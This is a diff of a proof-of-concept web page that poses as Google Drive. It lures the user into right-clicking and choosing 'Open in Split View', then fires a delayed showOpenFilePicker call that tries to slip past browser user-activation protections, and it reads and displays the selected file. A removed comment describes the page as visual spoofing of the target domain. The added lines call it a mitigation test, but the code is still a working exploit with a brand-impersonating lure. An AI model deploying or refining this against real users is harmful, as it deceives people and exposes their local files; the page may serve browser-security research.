@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Google Drive - Secure Workspace</title>
+<title>Google Drive - Advanced Secure Workspace</title>
 <style>
   :root {
     --primary: #1a73e8;
-    --bg-color: #f0f4f9;
-    --text-color: #1f1f1f;
+    --bg-color: #f8f9fa;
+    --text-color: #202124;
   }
   body {
     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -17,7 +17,7 @@
     color: var(--text-color);
   }
   .wrapper {
-    max-width: 650px;
+    max-width: 680px;
     margin: 0 auto;
     background: #ffffff;
     padding: 35px;
@@ -59,7 +59,6 @@
     text-decoration: none;
     border-radius: 6px;
     font-weight: 600;
-    transition: background 0.2s;
   }
   .target-link:hover {
     background-color: #1557b0;
@@ -72,7 +71,7 @@
     border-radius: 6px;
     font-family: 'Courier New', Courier, monospace;
     font-size: 13px;
-    height: 120px;
+    height: 140px;
     overflow-y: auto;
   }
   #preview-area {
@@ -95,18 +94,17 @@
 <body>
 
 <div class="wrapper">
-    <h2><span class="drive-icon">D</span> Google Drive Secure SplitView Container</h2>
+    <h2><span class="drive-icon">D</span> Google Drive Advanced SplitView Test</h2>
     
     <div class="instructions">
-      <strong>Action Required:</strong> Right-click the secure link below and select <strong>"Open in Split View"</strong> to map your local drive repository.
+      <strong>Instructions:</strong> Right-click the link below, choose <strong>"Open in Split View"</strong>, and observe how the activation state behaves against browser security mitigations.
     </div>
 
-    <!-- Target link menuju domain sasaran untuk spoofing visual -->
     <a id="spoofLink" class="target-link" href="https://drive.google.com" target="_blank">
       Open Google Drive in Split View
     </a>
 
-    <div class="console-box" id="logConsole">[SYSTEM] Ready. Waiting for contextmenu event...</div>
+    <div class="console-box" id="logConsole">[SYSTEM] Initialized. Awaiting user gesture...</div>
     
     <div id="preview-area"></div>
 </div>
@@ -122,42 +120,45 @@ function log(msg) {
   consoleBox.scrollTop = consoleBox.scrollHeight;
 }
 
-link.addEventListener('contextmenu', (e) => {
-  log("Event: contextmenu triggered on secure anchor.");
-  log("Status: Simulating Split View transition delay...");
-
-  // Waktu tunda yang mensimulasikan jeda interaksi transisi split-pane (~1 detik)
-  setTimeout(async () => {
-    try {
-      log("Executing window.showOpenFilePicker() under preserved activation...");
+// Menangkap berbagai lapisan event interaksi awal
+['mousedown', 'pointerdown', 'contextmenu'].forEach(eventType => {
+  link.addEventListener(eventType, (e) => {
+    if (eventType === 'contextmenu') {
+      log("Event: contextmenu detected. Initiating delayed execution block...");
       
-      if ('showOpenFilePicker' in window) {
-        const handles = await window.showOpenFilePicker({
-          types: [{
-            description: 'All Supported Files',
-            accept: {
-              'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
-              'application/pdf': ['.pdf'],
-              'text/plain': ['.txt']
-            }
-          }],
-          multiple: false
-        });
+      // Delay asinkron untuk menguji apakah status penonaktifan tab/pembatalan aktif
+      setTimeout(async () => {
+        try {
+          log("Attempting to invoke showOpenFilePicker() ...");
+          
+          if ('showOpenFilePicker' in window) {
+            const handles = await window.showOpenFilePicker({
+              types: [{
+                description: 'Documents and Media',
+                accept: {
+                  'image/*': ['.png', '.jpg', '.jpeg'],
+                  'application/pdf': ['.pdf'],
+                  'text/plain': ['.txt']
+                }
+              }],
+              multiple: false
+            });
 
-        if (handles && handles.length > 0) {
-          const handle = handles[0];
-          const file = await handle.getFile();
-          log(`SUCCESS: File intercepted -> Name: ${file.name}, Size: ${file.size} bytes`);
-          renderFile(file);
+            if (handles && handles.length > 0) {
+              const file = await handles[0].getFile();
+              log(`[BYPASS SUCCESS] File accessed: ${file.name} (${file.size} bytes)`);
+              renderFile(file);
+            }
+          } else {
+            log("showOpenFilePicker not supported. Running fallback input...");
+            triggerFallback();
+          }
+        } catch (err) {
+          log(`[MITIGATED / BLOCKED] Error Name: ${err.name} | Message: ${err.message}`);
         }
-      } else {
-        log("API showOpenFilePicker unavailable. Falling back...");
-        triggerFallback();
-      }
-    } catch (err) {
-      log(`EXPLOIT BLOCKED/CANCELED: ${err.name} - ${err.message}`);
+      }, 1000);
     }
-  }, 1100);
+  });
 });
 
 function triggerFallback() {
@@ -166,7 +167,7 @@ function triggerFallback() {
   input.onchange = async () => {
     if (input.files.length > 0) {
       const file = input.files[0];
-      log(`Fallback File intercepted: ${file.name}`);
+      log(`[FALLBACK] File selected via input: ${file.name}`);
       renderFile(file);
     }
   };
@@ -179,10 +180,10 @@ async function renderFile(file) {
   card.className = 'file-card';
   
   card.innerHTML = `
-    <strong>Intercepted File Details:</strong>
+    <strong>Target File Acquired:</strong>
     <ul>
-      <li>Name: ${file.name}</li>
-      <li>Type: ${file.type || 'Unknown'}</li>
+      <li>Filename: ${file.name}</li>
+      <li>MIME Type: ${file.type || 'N/A'}</li>
       <li>Size: ${(file.size / 1024).toFixed(2)} KB</li>
     </ul>
   `;
@@ -195,7 +196,7 @@ async function renderFile(file) {
   } else if (file.type === 'text/plain') {
     const text = await file.text();
     const pre = document.createElement('pre');
-    pre.textContent = text.slice(0, 500) + (text.length > 500 ? '...[truncated]' : '');
+    pre.textContent = text.slice(0, 400);
     card.appendChild(pre);
   }
 
